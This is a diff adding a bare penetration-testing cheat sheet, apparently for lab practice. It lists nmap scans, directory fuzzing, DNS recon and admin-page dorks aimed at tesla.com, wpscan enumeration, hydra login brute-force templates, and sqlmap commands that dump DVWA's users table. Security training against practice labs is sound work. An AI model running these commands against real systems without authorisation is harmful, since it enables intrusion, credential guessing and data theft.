@@ -1,0 +1,40 @@
+sudo nmap -sn <TARGET-IP>/24
+sudo nmap -sV -O -p- -A -T4 <TARGET-IP>
+sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com
+sudo nmap -F testphp.vulnweb.com
+
+gobuster dir -u http://<LAB-MACHINE-IP> -w /usr/share/wordlists/dirb/common.txt
+
+ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+dnsrecon -d tesla.com
+dnsrecon -d tesla.com -t std --xml tesla_dns.xml
+dnsrecon -d tesla.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+theHarvester -d tesla.com -b bing
+
+dig tesla.com
+dig +short NS tesla.com
+dig +short MX tesla.com
+
+inurl:admin site:tesla.com
+intitle:"login" site:tesla.com
+inurl:login site:testphp.vulnweb.com
+filetype:php inurl:admin
+site:github.com inurl:login
+
+wpscan --url http://<TARGET-IP> --enumerate u,vp,vt
+
+
+hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET-IP> http-post-form "<LOGIN_PATH>:<POST-DATA>:<FAILURE_MESSAGE>"
+
+hydra -L <USER_LIST> -p <PASSWORD> <TARGET-IP> http-post-form "<LOGIN_PATH>:<POST-DATA>:<FAILURE_MESSAGE>"
+
+hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET-IP> http-post-form "<LOGIN_PATH>:<POST-DATA>:<FAILURE_MESSAGE>"
+
+
+sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs
+
+sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5
+
+sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5
